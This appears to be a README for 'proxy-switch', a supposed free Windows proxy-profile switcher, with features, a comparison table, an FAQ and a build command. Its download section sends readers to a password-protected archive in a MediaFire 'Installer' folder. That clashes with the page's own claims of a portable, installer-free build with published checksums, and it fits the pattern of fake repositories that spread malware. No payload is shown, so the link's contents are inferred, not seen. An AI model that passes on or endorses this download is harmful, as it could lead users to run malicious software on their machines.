# proxy-switch

🔀 Free, open-source proxy switcher for Windows — toggle system proxy profiles with one hotkey, offline. 100 MB portable, no account, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Profile list** — save named HTTP, HTTPS, SOCKS and PAC configurations and switch with one click
- ✅ **Global hotkey cycle** — Ctrl+Alt+P rotates through profiles without opening a window
- ✅ **Per-network memory** — remembers which profile belongs to office, home and lab Wi-Fi by SSID
- ✅ **Bypass list editor** — manage the no-proxy-for list per profile with comma-separated editing
- ✅ **Status truth** — tray icon reflects what WinINET actually uses, not what you think you set
- ✅ **Light and dark tray packs** — readable on both taskbar themes
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why proxy-switch

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **proxy-switch** | Proxy Switcher | ProxyCap | Windows Settings |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Paid | Built-in |
| Open source | **Yes** | No | No | No |
| Named profiles with hotkey | **Yes** | Partial | Yes | No |
| Per-SSID auto-switch | **Yes** | No | No | No |
| Bypass list editor | **Yes** | Partial | Yes | Clunky |
| Portable, no install | **Yes, 100 MB** | Installer | Installer | With OS |

## FAQ

**how to switch proxy settings quickly on Windows?**

The Settings proxy page is four clicks deep with no profiles, and QA teams end up toggling fields by hand dozens of times a day. proxy-switch stores named profiles, cycles them from a hotkey and can bind a profile to a Wi-Fi network automatically. It is a 100 MB portable exe, MIT, offline with no account.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark profile list (#121417, blue #60A5FA): three profiles (Office SOCKS, QA HTTP, Direct) with radio dots, active one glowing, hotkey chip below.
2. Profile editor: host and port fields, PAC URL input, bypass list text area, test connection button with latency readout.
3. Auto-rules view: SSID to profile mapping table, tray theme preview pair, log of last ten switches with timestamps.

## Download

| Source | Link |
|---|---|
| 💾 **Installer proxy-switch** | [Installer proxy-switch](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).